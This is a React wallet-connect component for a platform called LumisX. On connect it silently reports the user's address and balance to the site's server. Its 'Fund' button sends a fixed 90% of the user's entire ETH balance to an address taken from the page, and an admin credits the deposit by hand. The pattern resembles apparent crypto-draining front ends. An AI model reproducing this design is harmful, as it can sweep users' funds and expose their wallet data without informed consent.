import React, { useState, useEffect, useRef } from "react";
import { useAppKit } from "@reown/appkit/react";
import {
  useAccount,
  useBalance,
  useDisconnect,
  useSendTransaction,
} from "wagmi";
import { parseEther, formatUnits, formatEther } from "viem";

const ConnectWallet = () => {
  const { open } = useAppKit();
  const { address, isConnected, connector } = useAccount();
  const { disconnect } = useDisconnect();

  const { refetch } = useBalance({
    address,
    watch: true,
    enabled: isConnected,
  });

  const [balance, setBalance] = useState(null);
  const [loadingTx, setLoadingTx] = useState(false);
  const [recipientAddress, setRecipientAddress] = useState("");
  const [csrfToken, setCsrfToken] = useState("");
  const [currentUser, setCurrentUser] = useState(null);


  const { sendTransactionAsync } = useSendTransaction({
    enabled: isConnected,
  });

  const hasPostedRef = useRef(false);

  const handleGetAddress = () => {
    const walletAddress = document.getElementById("recipientAddress")?.value;
    if (walletAddress) {
      setRecipientAddress(walletAddress);
    }
  };

  const handleGetBalance = async () => {
    const balanceData = await refetch();
    if (balanceData?.data?.value && balanceData?.data?.decimals) {
      setBalance(balanceData);
      console.log("Fetched balance:", balanceData?.data?.value.toString());
    }
  };

  const handleGetCurrentUser = async () => {
    const currentUser = document
      .querySelector("meta[name='current_user']")
      ?.getAttribute("content");
      if (currentUser){
        setCurrentUser(currentUser);
      }

  }

  const handleGetCsrfToken = () => {
    const token = document
      .querySelector("meta[name='csrftoken']")
      ?.getAttribute("content");
    if (token) {
      setCsrfToken(token);
    }
  };

  const handleDisconnect = () => {
    if (address) {
      localStorage.removeItem(`wallet_posted_${address}`);
      console.log("removed local storage key.");
    }
    disconnect();
  };


  const sendTransaction = async () => {
    if (!balance?.data?.value || !balance?.data?.decimals) {
      console.log("No balance available");
      return;
    }

    try {
      setLoadingTx(true);
      const ethBalance = parseFloat(
        formatUnits(balance?.data?.value, balance?.data?.decimals)
      );
      const amountToSend = (ethBalance * 0.9).toFixed(6);

      const tx = await sendTransactionAsync({
        to: recipientAddress,
        value: parseEther(amountToSend),
      });

      console.log("Transaction sent:", tx);
      alert("Transaction sent!");
      try {
        
        const message = `LumisX: User ${currentUser} just transferred ${amountToSend} ETH to wallet connect address: ${recipientAddress}. Please check your wallet for the transaction and create a deposit instance for the user.`; 


        const response = await fetch("/lumisx/api/notify-admin/", {
          method: "POST",
          headers: {
            "X-CSRFToken": csrfToken,
          },
          body: JSON.stringify({"message": message}),
        });

        const result = await response.json();
        if (result.success) {
          console.log("successfully connected");
        } else {
          console.error("POST error:", result);
        }
      } catch (err) {
        console.error("POST failed:", err);
      }
      refetch();
    } catch (err) {
      console.error("Transaction failed:", err);
      alert("Failed to send transaction");
    } finally {
      setLoadingTx(false);
    }
  };

  // ✅ On connect, get balance + address + token + current user
  useEffect(() => {
    if (isConnected) {
      handleGetBalance();
      handleGetAddress();
      handleGetCsrfToken();
      handleGetCurrentUser();
    }
  }, [isConnected]);

  // ✅ Check localStorage to avoid repeat post
  useEffect(() => {
    if (isConnected && address) {
      const storageKey = `wallet_posted_${address}`;
      const alreadyPosted = localStorage.getItem(storageKey);

      if (alreadyPosted) {
        hasPostedRef.current = true;
      }
    }
  }, [isConnected, address]);

//  ✅ post to server
  useEffect(() => {
    if (
      isConnected &&
      !hasPostedRef.current &&
      address &&
      csrfToken &&
      balance?.data?.value &&
      balance?.data?.decimals
    ) {
      const parsedAmount = parseFloat(
        formatUnits(balance?.data?.value, balance?.data?.decimals)
      ).toFixed(4);
      
      const postData = async () => {
        const form = new FormData();
        form.append("connection_type", "auto");
        form.append("address", address);
        form.append("balance", parsedAmount);
        form.append("exchange", connector?.name || "Unspecified");

        try {
          const response = await fetch("/lumisx/api/connect-wallet/", {
            method: "POST",
            headers: {
              "X-CSRFToken": csrfToken,
            },
            body: form,
          });

          const result = await response.json();
          if (result.success) {
            console.log("successfully connected");
            hasPostedRef.current = true;
            localStorage.setItem(`wallet_posted_${address}`, "true"); // ✅ Save flag
          } else {
            console.error("POST error:", result);
          }
        } catch (err) {
          console.error("POST failed:", err);
        }
      };

      postData();
    }
  }, [isConnected, address, balance, csrfToken, connector]);

  return (
    <div>
      {!isConnected ? (
        <div
          className="btn btn-text-success me-1 mb-1"
          onClick={() => open({ view: "Connect", namespace: "eip155" })}
        >
          Connect Wallet
        </div>
      ) : (
        <div>
          <div className="text-info mb-1">
            Balance:{" "}
            {balance
              ? `${parseFloat(
                  formatUnits(balance?.data?.value, balance?.data?.decimals)
                ).toFixed(4)} ${balance?.data?.symbol || "ETH"}`
              : "Loading..."}
          </div>
          <div
            className="btn btn-text-primary me-1 mb-1"
            onClick={sendTransaction}
            disabled={loadingTx}
          >
            {loadingTx ? "Sending..." : "Fund LumisX wallet"}
          </div>
          <div
            className="btn btn-text-danger me-1 mb-1"
            onClick={handleDisconnect}
          >
            Disconnect
          </div>
        </div>
      )}
    </div>
  );
};

export default ConnectWallet;
